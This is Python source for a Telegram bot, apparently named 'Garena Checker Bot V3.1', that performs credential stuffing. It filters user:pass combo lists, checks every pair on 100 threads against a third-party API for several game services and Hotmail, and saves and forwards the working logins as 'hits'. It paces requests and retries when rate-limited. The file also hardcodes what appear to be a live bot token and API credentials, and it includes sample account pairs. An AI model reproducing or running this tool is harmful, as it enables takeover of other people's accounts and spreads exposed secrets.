# bot.py - GARENA CHECKER BOT V3.1 - LOC TK RA TXT
import subprocess
import sys
import importlib
import threading
import time
import json
import os
import re
import telebot
import requests
import signal
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
from collections import defaultdict
import random

def install_package(package_name):
    try:
        importlib.import_module(package_name)
    except ImportError:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package_name, "--no-cache-dir"])
        except:
            pass

for pkg in ["requests", "pyTelegramBotAPI"]:
    install_package(pkg)

# ========== FIX CHO RENDER WEB SERVICE ==========
import os as os_module
import threading as threading_module
from http.server import HTTPServer, BaseHTTPRequestHandler

class RenderHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            html = """<!DOCTYPE html>
<html>
<head><title>Garena Checker Bot</title></head>
<body style="font-family:Arial;text-align:center;padding:50px;background:#0a0a0a;color:#00ff00;">
<h1>Garena Checker Bot V3.1</h1>
<p>Status: <b style="color:#00ff00;">ALIVE</b></p>
<p>Admin: <a href="https://t.me/baohuyno1" style="color:#00ff00;">@baohuyno1</a></p>
<p>Version: <b>3.1 - LOC TK RA TXT</b></p>
</body>
</html>"""
            self.wfile.write(html.encode('utf-8'))
        elif self.path == '/ping':
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"pong")
        elif self.path == '/stats':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            stats_json = json.dumps({
                "status": "running",
                "uptime": str(datetime.now() - bot_start_time),
                "total_checked": stats.get("total", 0),
                "hits": stats.get("hits", 0),
                "dead": stats.get("dead", 0)
            })
            self.wfile.write(stats_json.encode('utf-8'))
        else:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Bot is running!")
    
    def log_message(self, format, *args):
        pass

def start_render_server():
    try:
        port = int(os_module.environ.get("PORT", 10000))
        server = HTTPServer(("0.0.0.0", port), RenderHandler)
        print(f"[*] Render web server chay tren port {port}")
        server.serve_forever()
    except Exception as e:
        print(f"[!] Loi web server: {e}")

threading_module.Thread(target=start_render_server, daemon=True).start()
# ==============================================

# ========== CẤU HÌNH ==========
TELEGRAM_BOT_TOKEN = "6367532329:AAEem2DziNWKZtFrA8goj5PGTOI4MVT7IKA"
ADMIN_CHAT_ID = "5736655322"
ADMIN_USERNAME = "baohuyno1"

API_BASE = "https://lol.nhatminh301.com"
API_USERNAME = "thaituduc"
API_PASSWORD = "thaituduc"

DEFAULT_THREADS = 100
DEFAULT_TIMEOUT = 30
DEFAULT_RETRIES = 3
API_DELAY = 0.3
BATCH_SIZE = 500

OUTPUT_HITS = "hits.txt"
OUTPUT_DEAD = "dead.txt"
OUTPUT_UNKNOWN = "unknown.txt"
OUTPUT_ERROR = "error.txt"
OUTPUT_RESULT = "result_full.txt"
OUTPUT_CLEAN = "clean_accounts.txt"
OUTPUT_REPORT = "report.txt"
OUTPUT_LOC = "loc_accounts.txt"

MAX_MESSAGE_LENGTH = 4000

# ========== DANH SÁCH SERVICE ==========
SERVICE_ROUTES = {
    "lienquan": {
        "route": "/api/lienquan",
        "desc": "Lien Quan Mobile",
        "icon": "🎮",
        "priority": 1
    },
    "miniworld": {
        "route": "/api/miniworld",
        "desc": "Mini World",
        "icon": "🌍",
        "priority": 2
    },
    "blockmango": {
        "route": "/api/blockmango",
        "desc": "Blockman Go",
        "icon": "🧱",
        "priority": 3
    },
    "deltaforce": {
        "route": "/api/deltaforce",
        "desc": "Delta Force",
        "icon": "🔫",
        "priority": 4
    },
    "hotmail": {
        "route": "/api/hotmail",
        "desc": "Hotmail",
        "icon": "📧",
        "priority": 5
    },
    "fc": {
        "route": "/api/fc",
        "desc": "FC Online",
        "icon": "⚽",
        "priority": 6
    },
    "fullpack": {
        "route": "/api/fullpack",
        "desc": "Fullpack",
        "icon": "📦",
        "priority": 7
    }
}

# ========== BIẾN TOÀN CỤC ==========
checking = False
stop_event = threading.Event()
pending_accounts = []
stats = {"total": 0, "checked": 0, "hits": 0, "dead": 0, "errors": 0, "unknown": 0}
file_lock = threading.Lock()
stats_lock = threading.Lock()
bot_start_time = datetime.now()
cache_results = {}
cache_lock = threading.Lock()
total_processed = 0

bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN, parse_mode="HTML")

def is_admin(chat_id):
    return str(chat_id) == str(ADMIN_CHAT_ID)

# ========== HÀM GỬI TIN NHẮN ==========
def safe_send_message(chat_id, text, reply_markup=None, parse_mode="HTML"):
    if not text:
        return
    
    if len(text) > MAX_MESSAGE_LENGTH:
        parts = []
        current_part = ""
        lines = text.split('\n')
        
        for line in lines:
            if len(current_part) + len(line) + 1 > MAX_MESSAGE_LENGTH:
                parts.append(current_part)
                current_part = line + '\n'
            else:
                current_part += line + '\n'
        
        if current_part:
            parts.append(current_part)
        
        for i, part in enumerate(parts):
            try:
                if i == len(parts) - 1 and reply_markup:
                    bot.send_message(chat_id, part.strip(), parse_mode=parse_mode, reply_markup=reply_markup)
                else:
                    bot.send_message(chat_id, part.strip(), parse_mode=parse_mode)
                time.sleep(0.1)
            except Exception as e:
                print(f"[!] Loi gui tin nhan: {e}")
    else:
        try:
            bot.send_message(chat_id, text, parse_mode=parse_mode, reply_markup=reply_markup)
        except Exception as e:
            print(f"[!] Loi gui tin nhan: {e}")

# ========== TẠO NÚT BẤM ==========
def create_main_keyboard():
    keyboard = ReplyKeyboardMarkup(resize_keyboard=True, row_width=3)
    buttons = [
        KeyboardButton("📝 Gui TK MK"),
        KeyboardButton("📁 Gui File TXT"),
        KeyboardButton("🔍 Loc TK MK"),
        KeyboardButton("📊 Trang thai"),
        KeyboardButton("📥 Tai Hits"),
        KeyboardButton("📥 Tai Dead"),
        KeyboardButton("📥 Tai Loc"),
        KeyboardButton("📥 Tai Report"),
        KeyboardButton("⚡ Check All"),
        KeyboardButton("⏹ Dung check"),
        KeyboardButton("👤 Admin"),
        KeyboardButton("📋 Service")
    ]
    keyboard.add(*buttons)
    return keyboard

def create_service_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    buttons = []
    
    sorted_services = sorted(SERVICE_ROUTES.items(), key=lambda x: x[1].get("priority", 99))
    
    for key, value in sorted_services:
        btn = InlineKeyboardButton(
            f"{value['icon']} {value['desc']}",
            callback_data=f"check_{key}"
        )
        buttons.append(btn)
    
    buttons.append(InlineKeyboardButton("⚡ Check All", callback_data="check_all"))
    keyboard.add(*buttons)
    return keyboard

def create_admin_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    buttons = [
        InlineKeyboardButton("👤 Admin", url="https://t.me/baohuyno1"),
        InlineKeyboardButton("📊 Status", callback_data="admin_status"),
        InlineKeyboardButton("📥 Hits", callback_data="admin_hits"),
        InlineKeyboardButton("📥 Dead", callback_data="admin_dead"),
        InlineKeyboardButton("📥 Loc", callback_data="admin_loc"),
        InlineKeyboardButton("📥 Report", callback_data="admin_report"),
        InlineKeyboardButton("⏹ Stop", callback_data="admin_stop"),
        InlineKeyboardButton("🗑 Clear", callback_data="admin_clear"),
        InlineKeyboardButton("📋 Services", callback_data="admin_services"),
        InlineKeyboardButton("⚡ Check All", callback_data="admin_checkall"),
        InlineKeyboardButton("📊 Stats", callback_data="admin_stats")
    ]
    keyboard.add(*buttons)
    return keyboard

# ========== LỌC TK MK CHỈ LẤY USER:PASS ==========
def loc_tk_mk_only(content):
    """
    Lọc chỉ lấy định dạng user:pass
    Bỏ qua tất cả thông tin khác
    """
    accounts = []
    seen = set()
    stats_loc = {"total": 0, "valid": 0, "invalid": 0, "duplicate": 0}
    
    if not content:
        return accounts, stats_loc
    
    lines = content.split('\n')
    stats_loc["total"] = len(lines)
    
    for line in lines:
        line = line.strip()
        if not line:
            continue
        
        if len(line) < 3 or len(line) > 500:
            stats_loc["invalid"] += 1
            continue
        
        # Tìm dấu : đầu tiên
        if ':' in line:
            parts = line.split(':', 1)
            if len(parts) == 2:
                user = parts[0].strip()
                pwd = parts[1].strip()
                
                # Kiểm tra user và pass hợp lệ
                if user and pwd and len(user) >= 2 and len(pwd) >= 1:
                    # Giữ nguyên user và pass
                    key = f"{user}:{pwd}"
                    if key not in seen:
                        seen.add(key)
                        accounts.append((user, pwd))
                        stats_loc["valid"] += 1
                    else:
                        stats_loc["duplicate"] += 1
                else:
                    stats_loc["invalid"] += 1
            else:
                stats_loc["invalid"] += 1
        else:
            stats_loc["invalid"] += 1
    
    return accounts, stats_loc

# ========== LỌC TỪ FILE ==========
def loc_file_to_txt(file_path):
    """
    Lọc file và xuất ra file txt chỉ chứa user:pass
    """
    accounts = []
    seen = set()
    stats_loc = {"total": 0, "valid": 0, "invalid": 0, "duplicate": 0}
    
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                stats_loc["total"] += 1
                line = line.strip()
                if not line:
                    continue
                
                if len(line) < 3 or len(line) > 500:
                    stats_loc["invalid"] += 1
                    continue
                
                if ':' in line:
                    parts = line.split(':', 1)
                    if len(parts) == 2:
                        user = parts[0].strip()
                        pwd = parts[1].strip()
                        
                        if user and pwd and len(user) >= 2 and len(pwd) >= 1:
                            key = f"{user}:{pwd}"
                            if key not in seen:
                                seen.add(key)
                                accounts.append((user, pwd))
                                stats_loc["valid"] += 1
                            else:
                                stats_loc["duplicate"] += 1
                        else:
                            stats_loc["invalid"] += 1
                    else:
                        stats_loc["invalid"] += 1
                else:
                    stats_loc["invalid"] += 1
    except Exception as e:
        print(f"[!] Loi doc file: {e}")
    
    return accounts, stats_loc

# ========== LƯU FILE LOC ==========
def save_loc_file(accounts):
    """
    Lưu danh sách account vào file txt
    """
    with file_lock:
        with open(OUTPUT_LOC, 'w', encoding='utf-8') as f:
            for user, pwd in accounts:
                f.write(f"{user}:{pwd}\n")

# ========== CHECK API ==========
def check_account_api(username, password, service):
    cache_key = f"{username}:{password}:{service}"
    with cache_lock:
        if cache_key in cache_results:
            return cache_results[cache_key]
    
    route = SERVICE_ROUTES.get(service, {}).get("route", "/api/lienquan")
    url = f"{API_BASE}{route}"
    
    params = {
        "username": API_USERNAME,
        "password": API_PASSWORD,
        "tk": username,
        "mk": password
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json"
    }
    
    time.sleep(API_DELAY + random.uniform(0, 0.1))
    
    for attempt in range(DEFAULT_RETRIES):
        try:
            resp = requests.get(url, params=params, headers=headers, timeout=DEFAULT_TIMEOUT)
            
            if resp.status_code == 200:
                try:
                    data = resp.json()
                    if isinstance(data, dict):
                        if data.get("status") == True or data.get("success") == True:
                            data["result"] = "hit"
                        elif data.get("status") == False or data.get("success") == False:
                            data["result"] = "dead"
                        else:
                            hit_keys = ["uid", "id", "name", "nickname", "data", "account"]
                            if any(key in data for key in hit_keys):
                                data["result"] = "hit"
                            else:
                                data["result"] = "dead"
                    
                    with cache_lock:
                        cache_results[cache_key] = data
                    return data
                except json.JSONDecodeError:
                    if "success" in resp.text.lower() or "ok" in resp.text.lower():
                        result = {"result": "hit"}
                    else:
                        result = {"result": "dead"}
                    with cache_lock:
                        cache_results[cache_key] = result
                    return result
            elif resp.status_code == 429:
                time.sleep(5)
            else:
                time.sleep(1)
        except:
            time.sleep(2)
    
    result = {"result": "error"}
    with cache_lock:
        cache_results[cache_key] = result
    return result

# ========== LƯU KẾT QUẢ ==========
def save_result(username, password, status, service=""):
    with file_lock:
        if status == "hit":
            with open(OUTPUT_HITS, 'a', encoding='utf-8') as f:
                f.write(f"{username}:{password}\n")
        elif status == "dead":
            with open(OUTPUT_DEAD, 'a', encoding='utf-8') as f:
                f.write(f"{username}:{password}\n")
        elif status == "unknown":
            with open(OUTPUT_UNKNOWN, 'a', encoding='utf-8') as f:
                f.write(f"{username}:{password}\n")
        else:
            with open(OUTPUT_ERROR, 'a', encoding='utf-8') as f:
                f.write(f"{username}:{password}\n")
        
        with open(OUTPUT_RESULT, 'a', encoding='utf-8') as f:
            f.write(f"{username}:{password}|{status}|{service}\n")

# ========== CHECK ĐƠN ==========
def check_single(chat_id, username, password, service="lienquan"):
    service_desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
    safe_send_message(chat_id, f"🔍 Dang check <code>{username}:{password}</code> voi {service_desc}...")
    
    result = check_account_api(username, password, service)
    result_type = result.get("result", "unknown")
    
    save_result(username, password, result_type, service)
    
    if result_type == "hit":
        safe_send_message(chat_id, f"✅ HIT - {service_desc}\n🔑 {username}:{password}")
    elif result_type == "dead":
        safe_send_message(chat_id, f"❌ DEAD - {service_desc}\n🔑 {username}:{password}")
    else:
        safe_send_message(chat_id, f"⚠️ ERROR - {service_desc}\n🔑 {username}:{password}")

# ========== CHECK NHIỀU ==========
def check_batch(chat_id, accounts, service):
    global checking, stats
    
    if checking:
        safe_send_message(chat_id, "⚠️ Dang check roi!")
        return
    
    checking = True
    stop_event.clear()
    
    total = len(accounts)
    stats = {
        "total": total,
        "checked": 0,
        "hits": 0,
        "dead": 0,
        "errors": 0,
        "unknown": 0,
        "start_time": time.time()
    }
    
    service_desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
    icon = SERVICE_ROUTES.get(service, {}).get("icon", "🔍")
    
    safe_send_message(chat_id, f"""
{icon} <b>BAT DAU CHECK</b>
📊 Tong: <code>{total}</code> accounts
🎯 Service: <b>{service_desc}</b>
⚡ Threads: <code>{DEFAULT_THREADS}</code>
""")
    
    def process_single(user, pwd):
        if stop_event.is_set():
            return
        
        result = check_account_api(user, pwd, service)
        result_type = result.get("result", "unknown")
        
        save_result(user, pwd, result_type, service)
        
        with stats_lock:
            stats["checked"] += 1
            
            if result_type == "hit":
                stats["hits"] += 1
                try:
                    safe_send_message(chat_id, f"✅ HIT - {service_desc}\n🔑 {user}:{pwd}")
                except:
                    pass
            elif result_type == "dead":
                stats["dead"] += 1
            else:
                stats["errors"] += 1
            
            if stats["checked"] % 50 == 0:
                try:
                    elapsed = time.time() - stats["start_time"]
                    speed = stats["checked"] / elapsed if elapsed > 0 else 0
                    percent = (stats["checked"] / total) * 100
                    safe_send_message(chat_id, f"""
📊 <b>TIEN DO</b>
✅ Checked: <code>{stats['checked']}/{total}</code> ({percent:.1f}%)
🔴 Hits: <code>{stats['hits']}</code>
❌ Dead: <code>{stats['dead']}</code>
⚡ Speed: <code>{speed:.1f}</code> acc/s
""")
                except:
                    pass
    
    with ThreadPoolExecutor(max_workers=DEFAULT_THREADS) as executor:
        futures = {executor.submit(process_single, user, pwd): (user, pwd) 
                   for user, pwd in accounts}
        
        for future in as_completed(futures):
            if stop_event.is_set():
                executor.shutdown(wait=False)
                break
    
    checking = False
    elapsed = time.time() - stats["start_time"]
    
    result_msg = f"""
✅ <b>CHECK HOAN TAT!</b>
📊 Tong: <code>{stats['total']}</code>
🔴 HIT: <code>{stats['hits']}</code>
❌ DEAD: <code>{stats['dead']}</code>
⚠️ Errors: <code>{stats['errors']}</code>
⏱ Thoi gian: <code>{elapsed:.1f}s</code>
"""
    safe_send_message(chat_id, result_msg)
    
    if stats["hits"] > 0 and os.path.exists(OUTPUT_HITS):
        with open(OUTPUT_HITS, 'rb') as f:
            try:
                bot.send_document(chat_id, f, caption=f"✅ hits.txt ({stats['hits']} acc)")
            except:
                pass

# ========== CHECK TẤT CẢ SERVICE ==========
def check_all_services(chat_id, accounts):
    global checking
    
    if checking:
        safe_send_message(chat_id, "⚠️ Dang check roi!")
        return
    
    if not accounts:
        safe_send_message(chat_id, "❌ Khong co accounts!")
        return
    
    checking = True
    stop_event.clear()
    
    total_accounts = len(accounts)
    total_services = len(SERVICE_ROUTES)
    
    safe_send_message(chat_id, f"""
⚡ <b>CHECK TAT CA SERVICE</b>
📊 Accounts: <code>{total_accounts}</code>
📋 Services: <code>{total_services}</code>
""")
    
    stats_all = {
        "total": total_accounts * total_services,
        "checked": 0,
        "hits": 0,
        "dead": 0,
        "errors": 0,
        "start_time": time.time()
    }
    
    def process_all(user, pwd, service):
        if stop_event.is_set():
            return
        
        result = check_account_api(user, pwd, service)
        result_type = result.get("result", "unknown")
        
        save_result(user, pwd, result_type, service)
        
        with stats_lock:
            stats_all["checked"] += 1
            if result_type == "hit":
                stats_all["hits"] += 1
            elif result_type == "dead":
                stats_all["dead"] += 1
            else:
                stats_all["errors"] += 1
    
    all_tasks = [(user, pwd, service) for user, pwd in accounts for service in SERVICE_ROUTES.keys()]
    
    with ThreadPoolExecutor(max_workers=DEFAULT_THREADS) as executor:
        futures = {executor.submit(process_all, user, pwd, service): (user, pwd, service) 
                   for user, pwd, service in all_tasks}
        
        for future in as_completed(futures):
            if stop_event.is_set():
                executor.shutdown(wait=False)
                break
    
    checking = False
    elapsed = time.time() - stats_all["start_time"]
    
    safe_send_message(chat_id, f"""
✅ CHECK ALL HOAN TAT!
📊 Hits: {stats_all['hits']}
❌ Dead: {stats_all['dead']}
⏱ Time: {elapsed:.1f}s
""")

# ========== XỬ LÝ CALLBACK ==========
@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    global pending_accounts
    
    if not is_admin(call.message.chat.id):
        bot.answer_callback_query(call.id, "❌ Ban khong co quyen!")
        return
    
    data = call.data
    
    if data.startswith("check_"):
        service = data.replace("check_", "")
        
        if service == "all":
            if pending_accounts:
                accounts = pending_accounts
                pending_accounts = []
                threading.Thread(target=check_all_services, args=(call.message.chat.id, accounts)).start()
            else:
                bot.answer_callback_query(call.id, "❌ Khong co accounts!")
            return
        
        if service not in SERVICE_ROUTES:
            bot.answer_callback_query(call.id, "❌ Service khong hop le!")
            return
        
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
        except:
            pass
        
        if pending_accounts:
            accounts = pending_accounts
            pending_accounts = []
            
            if len(accounts) == 1:
                user, pwd = accounts[0]
                threading.Thread(target=check_single, args=(call.message.chat.id, user, pwd, service)).start()
            else:
                threading.Thread(target=check_batch, args=(call.message.chat.id, accounts, service)).start()
        else:
            bot.answer_callback_query(call.id, "❌ Khong co accounts!")
    
    elif data == "admin_status":
        if checking:
            elapsed = time.time() - stats.get("start_time", time.time())
            speed = stats["checked"] / elapsed if elapsed > 0 else 0
            safe_send_message(call.message.chat.id, f"""
📊 TRANG THAI
🔄 Dang check: YES
✅ Checked: {stats['checked']}/{stats['total']}
🔴 HIT: {stats['hits']}
❌ DEAD: {stats['dead']}
⚡ Speed: {speed:.1f} acc/s
""")
        else:
            safe_send_message(call.message.chat.id, "💤 Bot dang ranh")
        bot.answer_callback_query(call.id)
    
    elif data == "admin_hits":
        try:
            with open(OUTPUT_HITS, 'rb') as f:
                bot.send_document(call.message.chat.id, f, caption="✅ hits.txt")
        except:
            safe_send_message(call.message.chat.id, "❌ Chua co hits!")
        bot.answer_callback_query(call.id)
    
    elif data == "admin_dead":
        try:
            with open(OUTPUT_DEAD, 'rb') as f:
                bot.send_document(call.message.chat.id, f, caption="❌ dead.txt")
        except:
            safe_send_message(call.message.chat.id, "❌ Chua co dead!")
        bot.answer_callback_query(call.id)
    
    elif data == "admin_loc":
        try:
            with open(OUTPUT_LOC, 'rb') as f:
                bot.send_document(call.message.chat.id, f, caption="📥 loc_accounts.txt")
        except:
            safe_send_message(call.message.chat.id, "❌ Chua co file loc!")
        bot.answer_callback_query(call.id)
    
    elif data == "admin_report":
        try:
            with open(OUTPUT_RESULT, 'rb') as f:
                bot.send_document(call.message.chat.id, f, caption="📊 report.txt")
        except:
            safe_send_message(call.message.chat.id, "❌ Chua co report!")
        bot.answer_callback_query(call.id)
    
    elif data == "admin_stop":
        stop_event.set()
        checking = False
        safe_send_message(call.message.chat.id, "🛑 Da dung check!")
        bot.answer_callback_query(call.id)
    
    elif data == "admin_clear":
        pending_accounts = []
        safe_send_message(call.message.chat.id, "✅ Da xoa pending!")
        bot.answer_callback_query(call.id)
    
    elif data == "admin_services":
        msg = "📋 DANH SACH SERVICE\n\n"
        for key, value in SERVICE_ROUTES.items():
            msg += f"{value['icon']} {value['desc']}\n"
        safe_send_message(call.message.chat.id, msg)
        bot.answer_callback_query(call.id)
    
    elif data == "admin_stats":
        safe_send_message(call.message.chat.id, f"""
📊 THONG KE
📁 Hits: {stats.get('hits', 0)}
❌ Dead: {stats.get('dead', 0)}
💾 Cache: {len(cache_results)}
""")
        bot.answer_callback_query(call.id)

# ========== XỬ LÝ TEXT ==========
@bot.message_handler(content_types=['text'])
def handle_text(message):
    global pending_accounts
    
    if not is_admin(message.chat.id):
        return
    
    text = message.text.strip()
    
    if text == "📝 Gui TK MK":
        safe_send_message(message.chat.id, """
📌 GUI TK MK
Gui truc tiep user:pass

VD:
ZzkeconzZ:thanhoppa2001
anhduckim1:kimanhduc1
""")
        return
    
    elif text == "📁 Gui File TXT":
        safe_send_message(message.chat.id, "📌 Gui file .txt chua danh sach")
        return
    
    elif text == "🔍 Loc TK MK":
        safe_send_message(message.chat.id, """
🔍 LOC TK MK
Gui file .txt de loc chi lay user:pass
Bo qua tat ca thong tin khac
""")
        return
    
    elif text == "📊 Trang thai":
        if checking:
            elapsed = time.time() - stats.get("start_time", time.time())
            speed = stats["checked"] / elapsed if elapsed > 0 else 0
            safe_send_message(message.chat.id, f"""
📊 TRANG THAI
🔄 Dang check: YES
✅ Checked: {stats['checked']}/{stats['total']}
🔴 HIT: {stats['hits']}
❌ DEAD: {stats['dead']}
⚡ Speed: {speed:.1f} acc/s
""")
        else:
            safe_send_message(message.chat.id, "💤 Bot dang ranh")
        return
    
    elif text == "📥 Tai Hits":
        try:
            with open(OUTPUT_HITS, 'rb') as f:
                bot.send_document(message.chat.id, f, caption="✅ hits.txt")
        except:
            safe_send_message(message.chat.id, "❌ Chua co hits!")
        return
    
    elif text == "📥 Tai Dead":
        try:
            with open(OUTPUT_DEAD, 'rb') as f:
                bot.send_document(message.chat.id, f, caption="❌ dead.txt")
        except:
            safe_send_message(message.chat.id, "❌ Chua co dead!")
        return
    
    elif text == "📥 Tai Loc":
        try:
            with open(OUTPUT_LOC, 'rb') as f:
                bot.send_document(message.chat.id, f, caption="📥 loc_accounts.txt")
        except:
            safe_send_message(message.chat.id, "❌ Chua co file loc!")
        return
    
    elif text == "📥 Tai Report":
        try:
            with open(OUTPUT_RESULT, 'rb') as f:
                bot.send_document(message.chat.id, f, caption="📊 report.txt")
        except:
            safe_send_message(message.chat.id, "❌ Chua co report!")
        return
    
    elif text == "⚡ Check All":
        if pending_accounts:
            accounts = pending_accounts
            threading.Thread(target=check_all_services, args=(message.chat.id, accounts)).start()
        else:
            safe_send_message(message.chat.id, "❌ Khong co accounts!")
        return
    
    elif text == "⏹ Dung check":
        stop_event.set()
        checking = False
        safe_send_message(message.chat.id, "🛑 Da dung check!")
        return
    
    elif text == "👤 Admin":
        safe_send_message(message.chat.id, "👤 ADMIN\n@baohuyno1", reply_markup=create_admin_keyboard())
        return
    
    elif text == "📋 Service":
        msg = "📋 DANH SACH SERVICE\n\n"
        for key, value in SERVICE_ROUTES.items():
            msg += f"{value['icon']} {value['desc']}\n"
        safe_send_message(message.chat.id, msg)
        return
    
    if text.startswith('/'):
        return
    
    # XỬ LÝ TK MK - Lọc sạch
    accounts, stats_loc = loc_tk_mk_only(text)
    
    if not accounts:
        safe_send_message(message.chat.id, """
❌ KHONG TIM THAY!
Format dung: user:pass
VD: ZzkeconzZ:thanhoppa2001
""")
        return
    
    pending_accounts = accounts
    
    # Lưu file loc
    save_loc_file(accounts)
    
    preview = '\n'.join([f"{u}:{p}" for u, p in accounts[:10]])
    total = len(accounts)
    
    msg = f"""
📌 DA NHAN {total} ACCOUNTS
✅ Valid: {stats_loc['valid']}
❌ Invalid: {stats_loc['invalid']}
🔄 Duplicate: {stats_loc['duplicate']}

Preview (10 dong dau):
{preview}

👇 Chon service de check:
"""
    
    safe_send_message(message.chat.id, msg, reply_markup=create_service_keyboard())

# ========== XỬ LÝ FILE ==========
@bot.message_handler(content_types=['document'])
def handle_document(message):
    global pending_accounts
    
    if not is_admin(message.chat.id):
        return
    
    try:
        if not message.document.file_name.endswith('.txt'):
            safe_send_message(message.chat.id, "❌ Chi ho tro file .txt!")
            return
        
        file_info = bot.get_file(message.document.file_id)
        content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
        
        # Lọc chỉ lấy user:pass
        accounts, stats_loc = loc_tk_mk_only(content)
        
        if not accounts:
            safe_send_message(message.chat.id, "❌ Khong tim thay user:pass trong file!")
            return
        
        pending_accounts = accounts
        
        # Lưu file loc
        save_loc_file(accounts)
        
        preview = '\n'.join([f"{u}:{p}" for u, p in accounts[:20]])
        total = len(accounts)
        
        msg = f"""
✅ LOC XONG!
📊 Tong: {total} accounts
✅ Valid: {stats_loc['valid']}
❌ Invalid: {stats_loc['invalid']}
🔄 Duplicate: {stats_loc['duplicate']}

Preview (20 dong dau):
{preview}

👇 Chon service de check:
"""
        
        safe_send_message(message.chat.id, msg, reply_markup=create_service_keyboard())
        
    except Exception as e:
        safe_send_message(message.chat.id, f"❌ Loi: {e}")

# ========== LỆNH /start ==========
@bot.message_handler(commands=['start'])
def cmd_start(message):
    if not is_admin(message.chat.id):
        return
    
    uptime = datetime.now() - bot_start_time
    hours = uptime.seconds // 3600
    minutes = (uptime.seconds % 3600) // 60
    
    bot.send_message(
        message.chat.id,
        f"""
🤖 GARENA CHECKER BOT V3.1
👤 Admin: @baohuyno1
⏱ Uptime: {hours}h {minutes}m

📌 CACH DUNG:
1. Gui user:pass -> Chon service
2. Gui file .txt -> Tu dong loc
3. Nhan nut chuc nang

💡 Chi lay dinh dang user:pass
""",
        reply_markup=create_main_keyboard()
    )

# ========== MAIN ==========
def main():
    print("=" * 60)
    print("    GARENA CHECKER BOT V3.1")
    print("    ADMIN: @baohuyno1")
    print("    LOC TK RA TXT")
    print("=" * 60)
    print(f"[*] Threads: {DEFAULT_THREADS}")
    print(f"[*] Delay: {API_DELAY}s")
    print(f"[*] Services: {len(SERVICE_ROUTES)}")
    print("=" * 60)
    
    while True:
        try:
            bot.polling(none_stop=True, interval=1, timeout=30)
        except Exception as e:
            print(f"[!] Loi: {e}")
            time.sleep(5)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Bot dung!")
        sys.exit(0)
